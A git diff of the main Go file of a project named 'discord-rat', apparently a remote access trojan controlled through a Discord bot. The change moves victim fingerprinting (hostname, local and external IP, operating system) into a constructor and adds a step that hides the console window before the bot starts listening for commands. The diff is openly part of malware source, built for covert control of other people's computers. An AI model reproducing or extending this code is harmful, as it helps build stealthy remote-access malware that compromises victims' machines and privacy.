@@ -20,36 +20,25 @@
 package main
 
 import (
-	"os"
-	"runtime"
-
 	"github.com/codeuk/discord-rat/cmd/bot"
 	"github.com/codeuk/discord-rat/pkg/agent"
-	"github.com/codeuk/discord-rat/pkg/agent/system"
+	"github.com/codeuk/discord-rat/pkg/util"
+	"github.com/codeuk/discord-rat/pkg/util/platforms"
 )
 
 var newAgent *agent.Agent
 
-// Create an Agent with all the necessary information
 func init() {
-	newAgent = &agent.Agent{}
-	newAgent.HostName, _ = os.Hostname()
-	newAgent.LocalIP = system.GetLocalIP()
-	newAgent.ExternalIP = system.GetExternalIP()
-
-	sys := "Unknown"
-	if runtime.GOOS == "windows" {
-		sys = "Windows"
-	} else if runtime.GOOS == "linux" {
-		sys = "Linux"
-	} else if runtime.GOOS == "darwin" {
-		sys = "MacOS"
-	}
-
-	newAgent.OS = sys
+	// Create a new agent for the current system.
+	newAgent = agent.NewAgent()
 }
 
 func main() {
+	if util.HideConsoleWindow {
+		// Hide the console window (cross-platform).
+		platforms.HideConsole()
+	}
+
 	// Initialize the Discord Bot and Session and listen for commands.
 	bot.Init(newAgent)
 }
